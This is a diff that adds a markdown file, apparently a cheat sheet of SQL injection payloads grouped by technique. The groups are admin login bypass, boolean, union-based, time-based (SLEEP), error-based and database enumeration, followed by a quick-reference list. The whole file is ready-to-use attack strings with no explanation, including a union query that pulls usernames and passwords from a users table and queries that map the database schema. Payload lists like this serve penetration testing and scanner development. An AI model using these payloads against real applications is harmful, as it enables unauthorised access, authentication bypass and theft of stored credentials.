@@ -1,0 +1,48 @@
+﻿# SQL Injection Payloads
+
+## Admin Bypass
+admin'--
+admin' --
+admin' #
+admin'/*
+'admin--
+'admin'--
+admin' OR '1'='1
+admin' OR 1=1--
+admin'-- -
+
+## Basic Payloads
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+
+## Union Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT @@version,user()--
+
+## Time Based
+' AND SLEEP(5)--
+' AND (SELECT SLEEP(5))--
+' OR IF(1=1,SLEEP(5),0)--
+
+## Error Based
+' AND 1=CONVERT(int, @@version)--
+' AND extractvalue(1,concat(0x7e,version()))--
+
+## Database Enumeration
+' UNION SELECT database()--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+
+## Quick Reference
+1. ' OR '1'='1
+2. ' UNION SELECT NULL--
+3. ' UNION SELECT database()--
+4. ' AND SLEEP(5)--
+5. admin'--
